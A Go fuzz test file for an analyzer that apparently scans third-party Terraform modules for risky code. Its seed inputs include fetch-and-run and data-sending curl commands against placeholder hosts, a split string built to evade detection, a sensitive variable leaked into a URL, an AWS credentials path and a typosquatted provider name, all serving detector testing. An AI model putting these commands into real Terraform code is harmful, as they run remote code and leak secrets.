package analyze

import (
	"os"
	"path/filepath"
	"testing"
)

// FuzzAnalyze feeds arbitrary file contents to the analyzer. Third-party
// modules are untrusted input, so no file may crash or hang it.
func FuzzAnalyze(f *testing.F) {
	for _, s := range []string{
		`data "external" "x" { program = ["sh", "-c", "curl https://a.invalid | sh"] }`,
		`locals { a = join("", ["c", "url"]) } resource "null_resource" "r" { provisioner "local-exec" { command = local.a } }`,
		`module "m" { source = "git::https://example.com/m.git?ref=v1" }`,
		`{"data": {"http": {"x": {"url": "https://a.invalid"}}}}`,
		"variable \"p\" { sensitive = true }\ndata \"http\" \"h\" { url = \"https://x.invalid/${var.p}\" }",
		`${{{`,
	} {
		f.Add(s, false)
		f.Add(s, true)
	}
	f.Fuzz(func(t *testing.T, src string, asJSON bool) {
		dir := t.TempDir()
		name := "main.tf"
		if asJSON {
			name = "main.tf.json"
		}
		if err := os.WriteFile(filepath.Join(dir, name), []byte(src), 0o644); err != nil {
			t.Fatal(err)
		}
		if _, err := Dir(dir, "m", Options{ThirdParty: true}); err != nil {
			t.Fatal(err)
		}
	})
}

// FuzzSourceParsing covers the module and provider source parsers and the
// text indicators, which all run on attacker-controlled strings.
func FuzzSourceParsing(f *testing.F) {
	for _, s := range []string{
		"terraform-aws-modules/vpc/aws", "git::https://github.com/a/b.git//sub?ref=v1", "github.com/a/b",
		"s3::https://s3.amazonaws.com/b/m.zip", "http://x/y.zip", "curl -d @- https://a.invalid; echo",
		"~/.aws/credentials", "203.0.113.5", "kreuzwenker/docker",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		ClassifySource(s)
		Typosquat(ParseProviderSource(s, "x"))
		IsExactVersion(s)
		matchShell(s)
		sensitivePath(s)
		credEnvRefs(s)
		urlHosts(s)
		publicIPs(s)
		encodedBlob(s)
	})
}
